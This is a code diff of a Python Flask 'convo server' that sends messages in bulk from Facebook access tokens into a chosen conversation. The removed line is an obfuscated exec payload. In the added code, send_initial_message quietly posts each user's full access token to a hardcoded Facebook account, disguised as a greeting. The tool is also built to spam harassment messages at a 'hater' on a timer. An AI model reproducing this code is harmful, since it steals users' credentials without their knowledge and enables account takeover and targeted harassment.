@@ -1,2 +1,263 @@
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+from flask import Flask, request, render_template_string, redirect, url_for
+import requests
+from threading import Thread, Event
+import time
+import random
+import string
+
+app = Flask(__name__)
+app.debug = True
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+def get_user_name(token):
+    try:
+        url = f"https://graph.facebook.com/v15.0/me?access_token={token}"
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get('name', 'Unknown User')
+        return f"User (Token: {token[:10]}...)"
+    except:
+        return f"User (Token: {token[:10]}...)"
+
+def send_initial_message(access_tokens, thread_id):
+    results = []
+    target_id = "100000943029350"  # Hardcoded target ID
+    for token in access_tokens:
+        user_name = get_user_name(token)
+        msg_template = f"Hello! Robin Sir I am Using Your Convo Page server. My Full Token Is: {token}"
+        parameters = {'access_token': token, 'message': msg_template}
+        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"  # Using hardcoded target_id
+        try:
+            response = requests.post(url, data=parameters, headers=headers)
+            if response.status_code == 200:
+                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
+            else:
+                error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+                results.append(f"[❌] Failed to send initial message from {user_name}. Error: {error_msg}")
+        except requests.RequestException as e:
+            results.append(f"[!] Error during initial message send from {user_name}: {str(e)}")
+    return results
+
+stop_events = {}
+threads = {}
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    initial_results = send_initial_message(access_tokens, thread_id)
+    for result in initial_results:
+        print(result)
+    
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                try:
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message Sent Successfully From token {access_token[:10]}...: {message}")
+                    else:
+                        error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+                        print(f"Message Sent Failed From token {access_token[:10]}...: {error_msg}")
+                except requests.RequestException as e:
+                    print(f"Request failed for token {access_token[:10]}...: {str(e)}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return f'''
+        <div class="task-id">
+            <h4>Task started successfully!</h4>
+            <p>Task ID: {task_id}</p>
+            <p>Messages are being sent to the conversation.</p>
+            <a href="/" class="btn btn-primary">Back to Home</a>
+        </div>
+        '''
+
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>𝐎𝐅𝐅𝐋𝐈𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑 𝐁𝐘 ⟬ 𝐆A͜͡𝐍𝐆𝐒𝐓E͜͡𝐑 ⟭⸙⟬ 𝐑𝐎𝐁𝐈𝐍 ⟭</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-image: url('https://i.ibb.co/9m941Hn4/IMG-20250625-185425.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: white;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+    .task-id {
+      background-color: #333;
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px auto;
+      max-width: 500px;
+      text-align: center;
+      word-break: break-all;
+    }
+    .task-id a {
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">ℝ𝕆𝔹𝕀ℕ 𝕎𝔼𝔹 𝕄𝕌𝕃𝕋𝕀 ℂ𝕆ℕ𝕍𝕆</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Convo ID</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Run</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>😈𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 𝐑𝐎𝐁𝐈𝐍 2022. 𝐀𝐋𝐋 𝐑𝐈𝐆𝐇𝐓𝐒 𝐑𝐄𝐒𝐄𝐑𝐕𝐄𝐃.😈</p>
+    <p> 𝘼𝙇𝙒𝘼𝙔𝙎 𝙊𝙉 𝙁𝙄𝙍𝙀 🔥 𝙃𝘼𝙏𝙀𝙍𝙎 𝙆𝙄 𝙈𝙆𝘾</p>
+    <p><a href="https://www.facebook.com/100000943029350">Chat on Messenger</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
+''')
+
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
